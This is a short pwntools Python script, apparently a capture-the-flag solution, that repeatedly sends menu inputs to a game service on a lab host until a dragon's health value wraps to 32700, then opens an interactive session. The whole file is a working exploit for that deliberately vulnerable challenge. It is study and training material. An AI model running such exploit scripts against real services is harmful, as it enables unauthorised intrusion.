#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *


host = args.HOST or 'exp-3-1'
port = int(args.PORT or 1342)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    return remote(argv, *a, **kw)

# -- Exploit goes here --

io = start()

print(io.recvuntil(b'select a menu option> ').decode())

while True:
    io.sendline(b'3\n1')
    io.recvuntil(b'select a menu option> ')
    io.sendline(b'3\n1')
    io.recvuntil(b'select a menu option> ')
    io.sendline(b'3\n2')
    output = io.recvuntil(b'select a menu option> ').decode()

    if 'Dragon health = 32700' in output:
        print(output)
        io.interactive()
    else:
        print(output)
